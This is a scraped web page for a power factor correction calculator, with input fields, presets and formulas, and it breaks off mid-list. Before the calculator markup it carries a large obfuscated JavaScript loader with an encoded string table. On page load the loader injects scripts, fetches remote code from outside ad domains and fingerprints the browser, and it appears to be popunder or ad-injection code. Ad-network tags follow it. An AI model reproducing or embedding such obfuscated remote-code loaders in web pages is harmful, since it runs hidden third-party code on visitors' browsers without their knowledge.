uK(){return[...rK]}function en(n,t,r,f,u){let o=n[e.vM]();return f&&f!==se?o?o(t,r,f,u)[e.xj](M=>M)[e.RK](()=>en(n,t,r,f,u)):nn(t,r,f,u):o?re[o](t,r||e.Nb)[e.xj](M=>(j[kn]=o,M))[e.RK](()=>en(n,t,r,f,u)):new O((M,d)=>d())}function oK(n,t){X(e.qK);let r=e.ir,f=De(),u=e.Dk[e.CK](ne(),e.iK)[e.CK](f,e.Kb)[e.CK](L(n));return Yr(u,t)[e.xj](o=>(ge(m,r),o))[e.RK](o=>{throw Ue(m,r,u),o})}function qK(n,t){X(e.mK);let r=e.wr,f=De(),u=e.Dk[e.CK](ne(),e.iK)[e.CK](f,e.jb)[e.CK](L(n));return Qr(u,t)[e.xj](o=>(ge(m,r),o))[e.RK](o=>{throw Ue(m,r,u),o})}function nn(n,t,r,f){X(e.oK);let u=e.Ir,o=De(),M=e.Dk[e.CK](ne(),e.iK)[e.CK](o,e.OM);return Hr(M,n,t,r,f)[e.xj](d=>(ge(m,u),d))[e.RK](d=>{throw Ue(m,u,M),d})}function et(n,t,r,f){X(e.WM),wn(ne());let u=e.TK,o=Ht();return Or(o,n,t,r,f)[e.xj](M=>(ge(m,u),M))[e.RK](M=>{throw Ue(m,u,o),M})}function tn(n,t,r,f){n=KK(n),r=r?r[e.kb]():e.h;let u=r&&r!==se?uK():fK();return X(e.h[e.CK](r,e.m)[e.CK](n)),en(u,n,t,r,f)[e.xj](o=>o&&o[e.Nr]?o:e.MK(e.lb,e.wb,e.Nr,o))}var rn=e.sr,Kn=e.Dr,MK=e.Ar,dK=e.er,iK=e.tr,cK=e.yr,zK=e.Lr,aK=e.Nr,fn,un;function on(n){let t=n&&n[e.tM]&&n[e.tM][e.cM],r=n&&n[e.tM]&&n[e.tM][e.pM],f=n&&n[e.tM]&&n[e.tM][e.BM],u=n&&n[e.tM]&&n[e.tM][e.QM],o=n&&n[e.tM]&&n[e.tM][e.VM],M=n&&n[e.tM]&&n[e.tM][e.HM],d=n&&n[e.tM]&&n[e.tM][e.nM],b=n&&n[e.tM]&&n[e.tM][e.uM],p=b===m||b===F,l=e.MK();o!==rn&&o!==Kn||(r===MK?(l[e.pM]=dK,l[e.sb]=A,l[e.uM]=m,l[e.Db]=F):r===iK&&M&&(!b||p)&&(l[e.pM]=cK,l[e.HM]=M,tn(t,d,u,f)[e.xj](J=>{let E=e.MK();E[e.pM]=aK,E[e.cM]=t,E[e.HM]=M,E[e.tM]=J,qn(o,E)})[e.RK](J=>{let E=e.MK();E[e.pM]=zK,E[e.cM]=t,E[e.HM]=M,E[e.Fb]=J&&J[e.P],qn(o,E)})),l[e.pM]&&qn(o,l))}function qn(n,t){switch(t[e.VM]=n,n){case Kn:un[e.PK](t);break;case rn:default:fn[e.PK](t);break}q[e.PK](t,e.fK)}function bK(){try{fn=new zn(rn),fn[e.T](e.P,on),un=new zn(Kn),un[e.T](e.P,on)}catch(n){}q[e.T](e.P,on)}var nt=i[e.qr];function jK(n,t,r){return new O((f,u)=>{X(e.Ab);let o;if([e.d,e.i,e.Z][e.LM](A)>-e.U){o=i[e.pK](e.zM);let M=i[e.hE](n);o[e.fj]=r,o[e.Yk](M),o[e.vE](e.OE,m),o[e.vE](e.WE,Je(g(ln)));try{nt[e.JM][e.xE](o,nt)}catch(d){(i[e.BM]||i[e.PM])[e.Yk](o)}}else R(n);N(()=>(o!==void e.J&&o[e.JM][e.gk](o),Jn(t)?(X(e.aE),f()):u()))})}function mK(n,t){let r=n===e.U?sr():g(ln);return tn(r,e.v,e.v,e.v)[e.xj](f=>(f=f&&e.Nr in f?f[e.Nr]:f,f&&zr(m,f),f))[e.RK](()=>ar(m))[e.xj](f=>{f&&jK(f,n,t)})}It();function Pe(n){return Jn()?e.v:(X(e.yM),Wt(),tt(n))}function tt(n){return A===e.U&&We()&&Ie(m),Re()?(Ve(),q[wt]=tn,Yn()[e.xj](t=>{if(t&&A===e.U){let r=new q[e.Tj];r[e.Pj](e.Yr,e.Dk[e.CK](t)),r[e.rM](Er,m),In(t),r[e.fj]=()=>{let f=i[e.pK](e.zM),u=i[e.hE](r[e.Nr][e.sk](e.yj(e.kY,e.qM),o()));f[e.fj]=n;function o(){let M=e.jY[e.CK](c[e.A]()[e.IK](e.lK)[e.kK](e.V));return q[M]=q[e.Ub],M}f[e.Yk](u),(i[e.BM]||i[e.PM])[e.Yk](f),N(()=>{f!==void e.J&&(f[e.JM][e.gk](f),qe())})},r[e.xk]();return}mK(A,n)[e.xj](()=>{En([m,F],ne())})})):N(tt,e.ok)}function EK(){We()&&Ie(F),St(n=>{try{return n&&We()&&(qe(),Ie(m)),wr(),Yn(!e.J)[e.xj](t=>{Mn(n,t)})[e.RK](()=>{Mn(n)})}catch(t){return Mn(n)}})}function Mn(n,t){let r=t||g(yn);In(r);let f=i[e.pK](e.zM);f[e.Rr]=()=>{qe(),Pe()},f[e.fj]=()=>{qe()},f[e.Ek]=e.gM[e.CK](r,e.Jb)[e.CK](n?m:F),(i[e.BM]||i[e.PM])[e.Yk](f)}q[Lt]=Pe,q[Xt]=Pe,N(Pe,e.Fr),Bn(Fe,Te),Bn(ce,Ne),bK(),Zt&&A===e.U&&EK();try{$}catch(n){}})()})(ue.entries({x:"AzOxuow",r:"Bget zafuruomfuaz (TFFB)",K:"Bget zafuruomfuaz (TFFBE)",j:"Bget zafuruomfuaz (Pagnxq Fms)",k:"Uzfqdefufumx",M:"Zmfuhq",b:"Uz-Bmsq Bget",E:"azoxuow",Y:"zmfuhq",S:"bgetqd-gzuhqdemx",g:"qz",C:"rd",G:"pq",h:"",v:null,O:"e",W:"o",c:"v",p:"k",B:"b",Q:"j",V:2,H:"oxuow",n:"fagot",u:"7.0.9",z:"lrsbdajktffb",a:"lrsradymfe",X:"radQmot",J:0,U:1,d:4,Z:5,i:3,w:6,I:7,l:"g",s:"fdkFab",D:"sqfBmdqzfZapq",A:"dmzpay",e:"fuyqe",t:"ogddqzf",y:"dqmpk",L:"pmfq",N:"fxp",F:"\r\n",q:",",R:"F",m:":",o:"dmi",T:"mppQhqzfXuefqzqd",P:"yqeemsq",f:"yspn9a79sh",xr:"q5qedx1ekg5",rr:"Fawqz",Kr:"Rmhuoaz",jr:"Oazfqzf-Fkbq",kr:"fqjf/tfyx",Mr:"mbbxuomfuaz/veaz",br:"veaz",Er:"nxan",Yr:"SQF",Sr:"BAEF",gr:"TQMP",Cr:"mbbxuomfuaz/j-iii-rady-gdxqzoapqp; otmdeqf=GFR-8",Gr:"Mooqbf-Xmzsgmsq",hr:"j-mbbxuomfuaz-wqk",vr:"j-mbbxuomfuaz-fawqz",Or:"__PX_EQEEUAZ_",Wr:"lrspxbabgb",cr:"puh",pr:999999,Br:"gdx(pmfm:uymsq/sur;nmeq64,D0xSAPxtMCMNMUMMMMMMMB///kT5NMQMMMMMXMMMMMMNMMQMMMUNDMM7)",Qr:"xuzw",Vr:"efkxqetqqf",Hr:"mzazkyage",nr:"fqjf/oee",ur:"lUzpqj",zr:"nmowsdagzpUymsq",ar:"zdm8od49pds",Xr:"r",Jr:"gzwzaiz",Ur:"PQXUHQDK_VE",dr:"PQXUHQDK_OEE",Zr:"BDAJK_VE",ir:"BDAJK_OEE",wr:"BDAJK_BZS",Ir:"BDAJK_JTD",lr:"f4wp70p8osq",sr:"gwtrajlpasc",Dr:"wmtityzzu",Ar:"buzs",er:"bazs",tr:"dqcgqef",yr:"dqcgqef_mooqbfqp",Lr:"dqcgqef_rmuxqp",Nr:"dqebazeq",Fr:1e4,qr:"ogddqzfEodubf",Rr:"azqddad",mr:1e3,or:"zmh",Tr:42,Pr:36e5,fr:"geqdMsqzf",xK:"efkxq",rK:"mzpdaup",KK:"u",jK:"iuzpaie zf",kK:"exuoq",MK:function(){let e={},q=[].slice.call(arguments);for(let i=0;i<q.length-1;i+=2)e[q[i]]=q[i+1];return e},bK:"bmdeq",EK:"vauz",YK:"([^m-l0-9]+)",SK:"xqzsft",gK:"__BBG_EQEEUAZ_1_",CK:"oazomf",GK:"_rmxeq",hK:"fqef",vK:"yageqpaiz",OK:"yageqgb",WK:"fagotqzp",cK:"fagotefmdf",pK:"odqmfqQxqyqzf",BK:"^tffbe?:",QK:"^//",VK:"^/",HK:48,nK:9,uK:"0",zK:"dqyahqQhqzfXuefqzqd",aK:"up",XK:"fmdsqfUp",JK:"tqustf",UK:"iuz",dK:"pao",ZK:"paoQxqyqzf",iK:"/",wK:".tfyx",IK:"faEfduzs",lK:36,sK:"dqpgoq",DK:".",AK:"!",eK:"//vayfuzsu.zqf/mbg.btb?lazqup=",tK:"&ar=1",yK:"ymfot",LK:10,NK:"ymb",FK:"ruxfqd",qK:"dqcgqefNkOEE",RK:"omfot",mK:"dqcgqefNkBZS",oK:"dqcgqefNkJTD",TK:"BDAJK_RDMYQ",PK:"baefYqeemsq",fK:"*",xj:"ftqz",rj:57,Kj:"rdayOtmdOapq",jj:35,kj:768,Mj:1024,bj:568,Ej:360,Yj:1080,Sj:736,gj:900,Cj:864,Gj:812,hj:667,vj:800,Oj:240,Wj:300,cj:"qz-GE",pj:"qz-SN",Bj:"qz-OM",Qj:"qz-MG",Vj:"eh-EQ",Hj:"bget",nj:"xaomfuaz",uj:"eodqqz",zj:"dqhqdeq",aj:"eod",Xj:"1bj",Jj:"mnagf:nxmzw",Uj:"BTB",dj:"VE",Zj:18e5,ij:"uBtazq|uBmp|uBap",wj:"Hqdeuaz\\/[^E]+Emrmdu",Ij:"rudqraj",lj:"su",sj:"mffmotQhqzf",Dj:"oeeDgxqe",Aj:"otmdOapqMf",ej:97,tj:122,yj:function(e,q){return new z(e,q)},Lj:60,Nj:120,Fj:480,qj:180,Rj:720,mj:"sqfFuyqlazqArreqf",oj:"bab",Tj:"JYXTffbDqcgqef",Pj:"abqz",fj:"azxamp",xk:"eqzp",rk:"fab",Kk:"lazqUp",jk:"radymf",kk:"urdmyq",Mk:"iupft",bk:"abmoufk",Ek:"edo",Yk:"mbbqzpOtuxp",Sk:"omxx",gk:"dqyahqOtuxp",Ck:"B",Gk:"Z",hk:"B/Z",vk:"Z/B",Ok:"B/Z/Z",Wk:"Z/B/Z",ck:"B/Z/B/Z",pk:"Z/Z/Z/Z",Bk:"00",Qk:"000",Vk:"0000",Hk:"00000",nk:"zqie",uk:"bmsqe",zk:"iuwu",ak:"ndaieq",Xk:"huqi",Jk:"yahuq",Uk:"mdfuoxq",dk:"mdfuoxqe",Zk:"efmfuo",ik:"bmsq",wk:"uzpqj",Ik:"iqn",lk:"rxaad",sk:"dqbxmoq",Dk:"tffbe://",Ak:3571,ek:"ep",tk:"sgy",yk:"bwqk",Lk:"befduzs",Nk:"begrrujqe",Fk:"mfan",qk:"DqsQjb",Rk:"pqoapqGDUOaybazqzf",mk:"Ymft",ok:100,Tk:2147483647,Pk:"ebxuf",fk:"puebmfotQhqzf",xM:"sqfFuyq",rM:"eqfDqcgqefTqmpqd",KM:"Otdayq\\/([0-9]{1,})",jM:"OduAE\\/([0-9]{1,})",kM:"Mzpdaup",MM:"Rudqraj",bM:56,EM:"rujqp",YM:"mgfa",SM:"oazfqzf",gM:"//",CM:"/qhqzf",GM:"&",hM:"tffbe:",vM:"eturf",OM:".veaz",WM:"dqcgqefNkUrdmyq",cM:"gdx",pM:"fkbq",BM:"napk",QM:"yqftap",VM:"otmzzqx",HM:"dqcgqef_up",nM:"dqebazeqFkbq",uM:"lazqup_mpnxaow",zM:"eodubf",aM:"rb",XM:"fzqyqxQfzqygoap",JM:"bmdqzfZapq",UM:16807,dM:"mnopqrstuvwxyzabcdefghijkl",ZM:27,iM:"baeufuaz",wM:"xqrf",IM:"dustf",lM:"naffay",sM:"bauzfqdQhqzfe",DM:"uzoxgpqe",AM:".iupsqf-oax-10-eb",eM:"faXaiqdOmeq",tM:"pmfm",yM:"efmdfXampuzs",LM:"uzpqjAr",NM:"pmfmeqf",FM:"oazfqzfIuzpai",qM:"s",RM:"Mphqdf1",mM:"MMN ",oM:" ",TM:"mbbxk",PM:"paogyqzfQxqyqzf",fM:"eqxqofadFqjf",xb:"tdqr",rb:"wqke",Kb:".oee?",jb:".bzs?",kb:"faGbbqdOmeq",Mb:"hqdeuaz",bb:"eagdoqLazqUp",Eb:"paymuz",Yb:"sqzqdmfuazFuyq",Sb:"qjfdm",gb:"|",Cb:"lazqup",Gb:"dqrqddqd",hb:"fuyq_purr",vb:"rmuxqp_gdx",Ob:"rmux_fuyq",Wb:"geqd_up",cb:"ogddqzf_gdx",pb:"xmef_egooqee",Bb:"egooqee_oagzf",Qb:"geqd_msqzf",Vb:"eodqqz_iupft",Hb:"eodqqz_tqustf",nb:"fuyqlazq",ub:"rmuxqp_gdx_paymuz",zb:"dqrqddqd_paymuz",ab:"ogddqzf_gdx_paymuz",Xb:"ndaieqd_xmzs",Jb:"/5/",Ub:"paogyqzf",db:"eqxqofad",Zb:"oazfqzfPaogyqzf",ib:"tqmp",wb:200,Ib:"taef",lb:"efmfge",sb:"omxxeusz",Db:"lazqup_adusuzmx",Ab:"efmdfUzvqofEodubfOapq",eb:"ruzp",tb:"geq-odqpqzfumxe",yb:"xmzsgmsq",Lb:"geqdXmzsgmsq",Nb:"fqjf",Fb:"qddad",qb:"sqfQxqyqzfeNkFmsZmyq",Rb:"eagdeqPuh",mb:"dqxmfuhq",ob:"hmxgq",Tb:"efkxqEtqqfe",Pb:"dqx",fb:"odaeeAdusuz",xE:"uzeqdfNqradq",rE:"iuftOdqpqzfumxe",KE:"bdafafkbq",jE:"%",kE:"rudefOtuxp",ME:2e3,bE:"sqfMxxDqebazeqTqmpqde",EE:"bai",YE:"6g90tD4d4Dd1r8xzjbbl",SE:"bdqhqzfPqrmgxf",gE:"efabUyyqpumfqBdabmsmfuaz",CE:"=",GE:"anvqof",hE:"odqmfqFqjfZapq",vE:"eqfMffdungfq",OE:"pmfm-lazq-up",WE:"pmfm-paymuz",cE:"faUEAEfduzs",pE:"?pahd=fdgq",BE:"efduzsurk",QE:"pdmiUymsq",VE:"fduy",HE:"[\\d\\z]+",nE:"/4/",uE:16,zE:12,aE:"qzpUzvqofEodubfOapq",XE:"nxaow",JE:"omzhme",UE:"sqfOazfqjf",dE:"2p",ZE:"sqfUymsqPmfm",iE:"efmfge_oapq",wE:"puebxmk",IE:30,lE:5e3,sE:"oxaeqp",DE:"f",AE:"baef",eE:"tqmpqde",tE:"qddad.oay",yE:"egnefduzs",LE:"eturfEfduzs ",NE:"ruxx",FE:"pmfq:",qE:32,RE:204,mE:"' ituxq dqcgqefuzs ",oE:": ",TE:"fuyqagf",PE:256,fE:"efmfgeFqjf",xY:"qddad dqcgqef fuyqagf",rY:"qddad '",KY:8,jY:"_",kY:"paogyqzf\\n"}).reduce((e,q)=>(ue.defineProperty(e,q[0],{get:()=>typeof q[1]!="string"?q[1]:q[1].split("").map(i=>{let w=i.charCodeAt(0);return w>=65&&w<=90?v.fromCharCode((w-65+26-12)%26+65):w>=97&&w<=122?v.fromCharCode((w-97+26-12)%26+97):i}).join("")}),e),{}),window,qt,h)});})();</script><script src="//x7i0.com/tag.min.js" data-zone="10075523" data-cfasync="false" async onerror="_qrjdusbc()" onload="_qvjlasax()"></script>
	// https://otieu.com/4/10073287
	<script type="text/javascript">
	atOptions = {
		'key' : 'd2c958463d3779db2ebb926d34c8afcc',
		'format' : 'iframe',
		'height' : 90,
		'width' : 728,
		'params' : {}
	};
</script>
<script type="text/javascript" src="//www.highperformanceformat.com/d2c958463d3779db2ebb926d34c8afcc/invoke.js"></script>
    <meta name="monetag" content="26e1db09a7d370f4eb6e7ef1bdee9ade">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Universal Power Factor Correction Calculator</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .glass-effect {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        .result-box {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            border-radius: 15px;
            padding: 20px;
            margin: 10px 0;
            color: white;
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
        }
        .input-field {
            transition: all 0.3s ease;
        }
        .input-field:focus {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
        }
        .calc-button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            transition: all 0.3s ease;
        }
        .calc-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 35px rgba(102, 126, 234, 0.4);
        }
        .warning-box {
            background: linear-gradient(135deg, #ff9a56 0%, #ff6b6b 100%);
            border-radius: 10px;
            padding: 15px;
            color: white;
            margin: 10px 0;
        }
        .info-box {
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            border-radius: 10px;
            padding: 15px;
            color: white;
            margin: 10px 0;
        }
        .success-box {
            background: linear-gradient(135deg, #56ab2f 0%, #a8e6cf 100%);
            border-radius: 10px;
            padding: 15px;
            color: white;
            margin: 10px 0;
        }
        .country-preset {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            padding: 10px;
            margin: 5px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .country-preset:hover {
            background: rgba(255, 255, 255, 0.1);
            transform: translateY(-2px);
        }
        .country-preset.selected {
            background: rgba(102, 126, 234, 0.3);
            border-color: rgba(102, 126, 234, 0.5);
        }
        @media print {
            body {
                background: white !important;
            }
            .glass-effect {
                background: white !important;
                backdrop-filter: none !important;
                border: 1px solid #ccc !important;
            }
        }
    </style>
</head>
<body class="min-h-screen py-8 px-4">
    <div class="max-w-7xl mx-auto">
        <!-- Header -->
        <div class="text-center mb-8">
            <h1 class="text-4xl font-bold text-white mb-4">
                <i class="fas fa-bolt text-yellow-400"></i>
                Universal Power Factor Correction Calculator
            </h1>
            <p class="text-xl text-gray-200">Professional Tool for Global Power Systems</p>
            <p class="text-sm text-gray-300 mt-2">Customizable for Any Country - Based on IEC 60831-1/2 & IEEE Std 1036-2010</p>
            <p class="text-sm text-white mt-3">
                <i class="fas fa-code text-yellow-400"></i>
                Designed by <strong class="text-white">YASSER ZAKARIA</strong> | 
                <a href="https://www.linkedin.com/in/eng-yasser-zakaria/" target="_blank" class="text-white hover:text-yellow-300 transition-colors underline">
                    <i class="fab fa-linkedin text-blue-400"></i> LinkedIn
                </a>
            </p>
        </div>

        <div class="grid grid-cols-1 xl:grid-cols-4 gap-8">
            <!-- Country/Region Settings -->
            <div class="glass-effect rounded-2xl p-6">
                <h2 class="text-xl font-bold text-white mb-4">
                    <i class="fas fa-globe text-green-400"></i>
                    Country/Region Settings
                </h2>
                
                <div class="space-y-4">
                    <div>
                        <label class="block text-white font-semibold mb-2">
                            <i class="fas fa-flag text-blue-400"></i>
                            Quick Presets
                        </label>
                        <div class="grid grid-cols-2 gap-2">
                            <div class="country-preset" onclick="loadCountryPreset('uae')">
                                <div class="text-white text-sm font-semibold">🇦🇪 UAE</div>
                                <div class="text-gray-300 text-xs">$10/kVA</div>
                            </div>
                            <div class="country-preset" onclick="loadCountryPreset('saudi')">
                                <div class="text-white text-sm font-semibold">🇸🇦 Saudi</div>
                                <div class="text-gray-300 text-xs">$8/kVA</div>
                            </div>
                            <div class="country-preset" onclick="loadCountryPreset('egypt')">
                                <div class="text-white text-sm font-semibold">🇪🇬 Egypt</div>
                                <div class="text-gray-300 text-xs">$3/kVA</div>
                            </div>
                            <div class="country-preset" onclick="loadCountryPreset('usa')">
                                <div class="text-white text-sm font-semibold">🇺🇸 USA</div>
                                <div class="text-gray-300 text-xs">$15/kVA</div>
                            </div>
                            <div class="country-preset" onclick="loadCountryPreset('germany')">
                                <div class="text-white text-sm font-semibold">🇩🇪 Germany</div>
                                <div class="text-gray-300 text-xs">$25/kVA</div>
                            </div>
                            <div class="country-preset" onclick="loadCountryPreset('custom')">
                                <div class="text-white text-sm font-semibold">⚙️ Custom</div>
                                <div class="text-gray-300 text-xs">Manual</div>
                            </div>
                        </div>
                    </div>

                    <div>
                        <label class="block text-white font-semibold mb-2">
                            <i class="fas fa-dollar-sign text-yellow-400"></i>
                            Demand Charge ($/kVA/month)
                        </label>
                        <input type="number" id="demandCharge" class="input-field w-full p-3 rounded-lg bg-white/90 border-0 focus:ring-4 focus:ring-blue-400 outline-none" placeholder="Enter demand charge" min="0" step="0.1">
                    </div>

                    <div>
                        <label class="block text-white font-semibold mb-2">
                            <i class="fas fa-thermometer-half text-red-400"></i>
                            Temperature Derating Factor
                        </label>
                        <input type="number" id="deratingFactor" class="input-field w-full p-3 rounded-lg bg-white/90 border-0 focus:ring-4 focus:ring-blue-400 outline-none" placeholder="1.0 = no derating" min="1" max="2" step="0.01" value="1.0">
                        <p class="text-xs text-gray-300 mt-1">1.0 = Normal, 1.15 = Hot climate, 1.3 = Very hot</p>
                    </div>

                    <div>
                        <label class="block text-white font-semibold mb-2">
                            <i class="fas fa-coins text-orange-400"></i>
                            Energy Cost ($/kWh)
                        </label>
                        <input type="number" id="energyCost" class="input-field w-full p-3 rounded-lg bg-white/90 border-0 focus:ring-4 focus:ring-blue-400 outline-none" placeholder="Enter energy cost" min="0" step="0.001">
                    </div>

                    <div>
                        <label class="block text-white font-semibold mb-2">
                            <i class="fas fa-plug text-purple-400"></i>
                            System Voltage (kV)
                        </label>
                        <select id="voltage" class="input-field w-full p-3 rounded-lg bg-white/90 border-0 focus:ring-4 focus:ring-blue-400 outline-none">
                            <option value="0.4">0.4 kV (Low Voltage)</option>
                            <option value="0.48">0.48 kV (North America LV)</option>
                            <option value="6.6">6.6 kV (Medium Voltage)</option>
                            <option value="11">11 kV (MV Distribution)</option>
                            <option value="13.8">13.8 kV (North America MV)</option>
                            <option value="22">22 kV (European MV)</option>
                            <option value="33">33 kV (MV Transmission)</option>
                            <option value="69">69 kV (Sub-transmission)</option>
                            <option value="132">132 kV (HV Transmission)</option>
                            <option value="custom">Custom Voltage</option>
                        </select>
                    </div>

                    <div id="customVoltageDiv" style="display: none;">
                        <label class="block text-white font-semibold mb-2">
                            <i class="fas fa-edit text-cyan-400"></i>
                            Custom Voltage (kV)
                        </label>
                        <input type="number" id="customVoltage" class="input-field w-full p-3 rounded-lg bg-white/90 border-0 focus:ring-4 focus:ring-blue-400 outline-none" placeholder="Enter custom voltage" min="0.1" step="0.1">
                    </div>
                </div>
            </div>

            <!-- System Parameters -->
            <div class="glass-effect rounded-2xl p-6">
                <h2 class="text-xl font-bold text-white mb-4">
                    <i class="fas fa-calculator text-blue-400"></i>
                    System Parameters
                </h2>
                
                <div class="space-y-4">
                    <div>
                        <label class="block text-white font-semibold mb-2">
                            <i class="fas fa-plug text-green-400"></i>
                            Load Active Power (kW)
                        </label>
                        <input type="number" id="activePower" class="input-field w-full p-3 rounded-lg bg-white/90 border-0 focus:ring-4 focus:ring-blue-400 outline-none" placeholder="Enter active power (e.g., 500)" min="0" step="0.1">
                    </div>

                    <div>
                        <label class="block text-white font-semibold mb-2">
                            <i class="fas fa-wave-square text-orange-400"></i>
                            Present Power Factor
                        </label>
                        <input type="number" id="presentPF" class="input-field w-full p-3 rounded-lg bg-white/90 border-0 focus:ring-4 focus:ring-blue-400 outline-none" placeholder="Enter current PF (e.g., 0.75)" min="0.1" max="1" step="0.01">
                    </div>

                    <div>
                        <label class="block text-white font-semibold mb-2">
                            <i class="fas fa-bullseye text-purple-400"></i>
                            Target Power Factor
                        </label>
                        <input type="number" id="targetPF" class="input-field w-full p-3 rounded-lg bg-white/90 border-0 focus:ring-4 focus:ring-blue-400 outline-none" placeholder="Enter target PF (e.g., 0.95)" min="0.1" max="1" step="0.01">
                    </div>

                    <div>
                        <label class="block text-white font-semibold mb-2">
                            <i class="fas fa-cogs text-red-400"></i>
                            Capacitor Bank Type
                        </label>
                        <select id="systemType" class="input-field w-full p-3 rounded-lg bg-white/90 border-0 focus:ring-4 focus:ring-blue-400 outline-none">
                            <option value="fixed">Fixed Capacitor Bank</option>
                            <option value="automatic">Automatic Capacitor Bank</option>
                        </select>
                    </div>

                    <div>
                        <label class="block text-white font-semibold mb-2">
                            <i class="fas fa-clock text-indigo-400"></i>
                            Operating Hours per Year
                        </label>
                        <input type="number" id="operatingHours" class="input-field w-full p-3 rounded-lg bg-white/90 border-0 focus:ring-4 focus:ring-blue-400 outline-none" placeholder="8760 for continuous" min="1" max="8760" step="1" value="8760">
                    </div>

                    <button onclick="calculatePFC()" class="calc-button w-full py-4 px-6 rounded-xl text-white font-bold text-lg">
                        <i class="fas fa-calculator mr-2"></i>
                        Calculate Power Factor Correction
                    </button>

                    <button onclick="resetForm()" class="w-full py-3 px-6 rounded-xl text-white font-semibold bg-gray-600 hover:bg-gray-700 transition-all">
                        <i class="fas fa-redo mr-2"></i>
                        Reset Form
                    </button>
                </div>
            </div>

            <!-- Charts Section -->
            <div class="glass-effect rounded-2xl p-6 mt-8 xl:mt-0" id="chartsSection" style="display: none;">
                <h2 class="text-xl font-bold text-white mb-4">
                    <i class="fas fa-chart-bar text-purple-400"></i>
                    Visual Analysis
                </h2>
                
                <div class="space-y-6">
                    <!-- Power Factor Comparison Chart -->
                    <div class="bg-white/10 rounded-lg p-4">
                        <h3 class="text-lg font-semibold text-white mb-3">Power Factor Comparison</h3>
                        <canvas id="powerFactorChart" width="400" height="200"></canvas>
                    </div>
                    
                    <!-- Financial Benefits Chart -->
                    <div class="bg-white/10 rounded-lg p-4">
                        <h3 class="text-lg font-semibold text-white mb-3">Financial Benefits</h3>
                        <canvas id="financialChart" width="400" height="200"></canvas>
                    </div>
                    
                    <!-- Export Buttons -->
                    <div class="space-y-2">
                        <button onclick="generatePDFReport()" class="w-full py-3 px-6 rounded-xl text-white font-semibold bg-red-600 hover:bg-red-700 transition-all">
                            <i class="fas fa-file-pdf mr-2"></i>
                            Export PDF Report
                        </button>
                        <button onclick="printReport()" class="w-full py-3 px-6 rounded-xl text-white font-semibold bg-blue-600 hover:bg-blue-700 transition-all">
                            <i class="fas fa-print mr-2"></i>
                            Print Report
                        </button>
                        <button onclick="saveCalculation()" class="w-full py-3 px-6 rounded-xl text-white font-semibold bg-green-600 hover:bg-green-700 transition-all">
                            <i class="fas fa-save mr-2"></i>
                            Save Calculation
                        </button>
                        <button onclick="showSavedCalculations()" class="w-full py-3 px-6 rounded-xl text-white font-semibold bg-purple-600 hover:bg-purple-700 transition-all">
                            <i class="fas fa-history mr-2"></i>
                            View Saved
                        </button>
                        <button onclick="showComparison()" class="w-full py-3 px-6 rounded-xl text-white font-semibold bg-indigo-600 hover:bg-indigo-700 transition-all">
                            <i class="fas fa-balance-scale mr-2"></i>
                            Compare Scenarios
                        </button>
                        <button onclick="showDetailedCostAnalysis()" class="w-full py-3 px-6 rounded-xl text-white font-semibold bg-yellow-600 hover:bg-yellow-700 transition-all">
                            <i class="fas fa-calculator mr-2"></i>
                            Detailed Cost Analysis
                        </button>
                    </div>
                </div>
            </div>

            <!-- Results Section -->
            <div class="glass-effect rounded-2xl p-6">
                <h2 class="text-xl font-bold text-white mb-4">
                    <i class="fas fa-chart-line text-green-400"></i>
                    Calculation Results
                </h2>
                
                <div id="results" class="space-y-4">
                    <div class="info-box text-center">
                        <i class="fas fa-info-circle text-2xl mb-2"></i>
                        <p>Configure your country settings and system parameters, then click calculate to see results</p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Formula Section -->
        <div class="glass-effect rounded-2xl p-8 mt-8">
            <h2 class="text-2xl font-bold text-white mb-6">
                <i class="fas fa-square-root-alt text-purple-400"></i>
                Technical Formulas & Standards
            </h2>
            
            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
                <div class="bg-white/10 rounded-lg p-6">
                    <h3 class="text-xl font-bold text-white mb-4">Primary Calculation</h3>
                    <div class="text-white space-y-2">
                        <p class="font-mono text-lg bg-gray-800 p-3 rounded">Q<sub>c</sub> = P × (tan φ₁ - tan φ₂)</p>
                        <p class="text-sm">Where:</p>
                        <ul class="text-sm space-y-1 ml-4">
                            <li>Q<sub>c</sub> = Required reactive power (kVAR)</li>
                            <li>P = Active power (kW)</li>
                            <li>φ₁ = arccos(present power factor)</li>
                            <li>φ₂ = arccos(target power factor)</li>
                        </ul>
                    </div>
                </div>

                <div class="bg-white/10 rounded-lg p-6">
                    <h3 class="text-xl font-bold text-white mb-4">Financial Calculation</h3>
                    <div class="text-white space-y-2">
                        <p class="font-mono text-sm bg-gray-800 p-3 rounded">Savings = (S₁ - S₂) × Demand Charge</p>
                        <p class="text-sm">Where:</p>
                        <ul class="text-sm space-y-1 ml-4">
                            <li>S₁ = P / PF₁ (Present apparent power)</li>
                            <li>S₂ = P / PF₂ (Target apparent power)</li>
                            <li>Demand Charge = $/kVA/month</li>
                        </ul>
                    </div>
                </div>

                <div class="bg-white/10 rounded-lg p-6">
                    <h3 class="text-xl font-bold text-white mb-4">Automatic Bank Sizing</h3>
                    <div class="text-white space-y-2">
                        <p class="text-sm">Standard Step Sizes (kVAR):</p>
                        <ul class="text-sm space-y-1 ml-4">
